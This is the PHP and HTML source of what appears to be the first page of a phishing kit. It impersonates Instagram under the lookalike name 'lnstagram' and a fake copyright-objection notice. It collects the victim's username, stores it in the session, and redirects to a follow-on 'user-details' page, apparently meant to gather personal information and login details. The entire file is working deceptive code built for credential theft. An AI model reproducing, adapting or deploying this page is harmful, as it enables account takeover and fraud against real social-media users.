<?php
ob_start();
session_start();
set_time_limit(0);
error_reporting(0);

if ($_GET) {

  $blind=$_GET["blndsc"];
  $_SESSION["blndsc"]=$blind;
  

        header("location: user-details.php?username=$blind");
    }
    ?>

<!DOCTYPE html>
<html>

<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
	<link rel="stylesheet" type="text/css" href="bestory.css">
	<title>lnstagram | Enter The Username</title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width,initial-scale=1">
	<link rel="icon" href="icon.png">
	<meta property="og:image" content="icon.png">
<meta property="og:description" content="Instagram Copyright Infringement Information Center ">
<meta property="og:title" content="lnstagram | Copyright">
	<script src="../../ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<link rel="stylesheet" type="text/css" href="../../use.fontawesome.com/releases/v5.12.1/css/all.css">

</head>
<body>
	<center>
		<div class="main_bestory">
			<img src="main-text.png" class="mainx_logo" alt="lnstagram" width=200>
			<br>
			<button type="submit" class="none_button"><i class="fab fa-facebook-square" id="req"></i> Continue With Facebook</button>
			<table class="table">
				<tr class="tr">
					<td class="td1"><div></div></td>
					<td class="td2"><p>or</p></td>
					<td class="td3"><div></div></td>
				</tr>
			</table>
			<br>	
				<form method="GET">
					<span class="bestory_text2">Enter your username and follow the next steps.<br>We need some personal information for copyright objection
</span><br>
			<input type="text" name="blndsc" placeholder="Kullanıcı Adı" required="" class="bestory_username" id="username"><br>
			<button type="submit" class="bestory_submit">next</button>
			<br>

			<span class="dont">Don't have Account?<span>&nbsp;Register</span></span>
				
				
			</div>
			<br><br><br><br><br><br><br>
<img src="from.png" width=150 class="img_bottom">
			<div class="bottom">
			<span>about </span>
					<span>Blog</span>
					<span>Jobs</span>
					<span>Help</span>
					<span>API</span>
					<span>Privacy</span>
					<span> Terms</span>
					<span>The Best Calculations</span>
					<span>Hashtag's</span>
					<span>Locations</span>
				</div>
	</center>

</body>
<script type="text/javascript">
	let btn=document.querySelector('.bestory_submit');
	let username=document.querySelector('.bestory_username');
	btn.disabled=true;
	btn.style.opacity="0.4";
	username.addEventListener('input',()=>{
		if(username.value.length>3){
			btn.disabled=false;
	btn.style.opacity="1";
		}else{
			btn.disabled=true;
	btn.style.opacity="0.4";
		}
	})
	
</script>

</html>